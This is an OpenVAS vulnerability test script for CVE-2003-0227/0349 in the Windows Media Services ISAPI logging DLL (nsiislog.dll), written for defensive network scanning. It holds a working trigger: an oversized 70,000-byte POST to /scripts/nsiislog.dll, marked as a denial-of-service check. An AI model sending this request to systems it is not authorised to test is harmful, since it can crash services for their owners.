###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ms_win_media_service_isapi_code_exec_vuln.nasl 5958 2017-04-17 09:02:19Z teissa $
#
# Microsoft Windows Media Services ISAPI Extension Code Execution Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation could allow remote attackers to obtain sensitive
  information, execute arbitrary code or cause denial of service conditions.
  Impact Level: System/Application";
tag_affected = "Windows Media Services 4.0 and 4.1
  Microsoft Windows NT 4.0
  Microsoft Windows 2000";
tag_insight = "Windows Media Services logging capability for multicast transmissions is
  implemented as ISAPI extension (nsiislog.dll), which fails to processes
  incoming client or malicious HTTP requests.";
tag_solution = "Run Windows Update and update the listed hotfixes or download and
  update mentioned hotfixes in the advisory from the below link,
  http://technet.microsoft.com/en-us/security/bulletin/ms03-019
  http://technet.microsoft.com/en-us/security/bulletin/ms03-022";
tag_summary = "This host is running Microsoft Windows Media Services and is prone
  to remote code execution vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802897";
CPE = "cpe:/a:microsoft:iis";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 5958 $");
  script_cve_id("CVE-2003-0227", "CVE-2003-0349");
  script_bugtraq_id(7727, 8035);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-04-17 11:02:19 +0200 (Mon, 17 Apr 2017) $");
  script_tag(name:"creation_date", value:"2012-07-25 16:04:16 +0530 (Wed, 25 Jul 2012)");
  script_name("Microsoft Windows Media Services ISAPI Extension Code Execution Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/9115");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/8883");
  script_xref(name : "URL" , value : "http://securitytracker.com/id?1007059");
  script_xref(name : "URL" , value : "http://www.kb.cert.org/vuls/id/113716");
  script_xref(name : "URL" , value : "http://technet.microsoft.com/en-us/security/bulletin/ms03-019");
  script_xref(name : "URL" , value : "http://technet.microsoft.com/en-us/security/bulletin/ms03-022");
  script_xref(name : "URL" , value : "http://support.microsoft.com/default.aspx?scid=kb;en-us;822343");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_active");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("secpod_ms_iis_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("IIS/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
 }


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variables Initialization
port = 0;
iisreq = "";
iisres = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Check port state
if(!get_port_state(port)){
  exit(0);
}

## Get Host name
host = get_host_name();
if(!host){
  exit(0);
}

url = "/scripts/nsiislog.dll";

iisreq = http_get(item: url, port: port);
iisres = http_keepalive_send_recv(port:port, data:iisreq, bodyonly:FALSE);

## Confirm is ISAPI is running
if(!iisres || ">NetShow ISAPI Log Dll" >!< iisres){
  exit(0);
}

postData = crap(data: "A", length: 70000);

## Construt malformed POST request
iisreq = string("POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Length: ", strlen(postData),
                "\r\n\r\n", postData);

## Send post request
iisres = http_send_recv(port:port, data:iisreq);

if(iisres && "HTTP/1.1 500 Server Error" >< iisres &&
   "The remote procedure call failed" >< iisres && "<title>Error" >< iisres){
  security_message(port);
}
